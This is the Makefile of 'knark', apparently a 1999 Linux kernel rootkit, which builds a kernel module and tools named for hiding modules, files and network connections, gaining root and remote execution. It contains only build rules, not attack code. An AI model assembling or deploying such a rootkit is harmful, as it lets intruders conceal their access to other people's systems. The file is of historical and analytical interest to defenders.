# Makefile, part of the knark package
# (c) Creed @ #hack.se 1999 <creed@sekure.net>
# 
# This Makefile may NOT be used in an illegal way,
# or to cause damage of ANY kind.
# (drop me a mail if you find a way to cause damage with a Makefile)
#
# See README for more info

MODDEFS = -D__KERNEL__ -DMODULE -DMODVERSIONS
CFLAGS = -Wall -O2
MODCFLAGS = -Wstrict-prototypes -fomit-frame-pointer -pipe -fno-strength-reduce -malign-loops=2 -malign-jumps=2 -malign-functions=2 -include /usr/src/linux/include/linux/modversions.h -I/usr/src/linux/include
SRCDIR = src
OBJS = $(SRCDIR)/author_banner.o

all:		knark modhide rootme hidef ered nethide rexec taskhack

knark:		$(SRCDIR)/knark.c
		$(CC) $(CFLAGS) $(MODCFLAGS) -c $(SRCDIR)/knark.c -o knark.o $(MODDEFS)

modhide:	$(SRCDIR)/modhide.c
		$(CC) $(CFLAGS) $(MODCFLAGS) -Wno-uninitialized -c $(SRCDIR)/modhide.c

hidef:		$(OBJS) $(SRCDIR)/hidef.o
		$(CC) $(CFLAGS) -o hidef $(OBJS) $(SRCDIR)/hidef.o
		strip hidef

rootme:		$(OBJS) $(SRCDIR)/rootme.o
		$(CC) $(CFLAGS) -o rootme $(OBJS) $(SRCDIR)/rootme.o

ered:		$(OBJS) $(SRCDIR)/ered.o
		$(CC) $(CFLAGS) -o ered $(OBJS) $(SRCDIR)/ered.o

nethide:	$(OBJS) $(SRCDIR)/nethide.o
		$(CC) $(CFLAGS) -o nethide $(OBJS) $(SRCDIR)/nethide.o

rexec:		$(OBJS) $(SRCDIR)/rexec.o
		$(CC) $(CFLAGS) -o rexec $(OBJS) $(SRCDIR)/rexec.o

taskhack:	$(OBJS) $(SRCDIR)/taskhack.o
		$(CC) $(CFLAGS) -o taskhack $(OBJS) $(SRCDIR)/taskhack.o

clean:
		rm -f knark.o modhide.o hidef unhidef rootme ered nethide rexec taskhack $(SRCDIR)/*.o $(SRCDIR)/*~
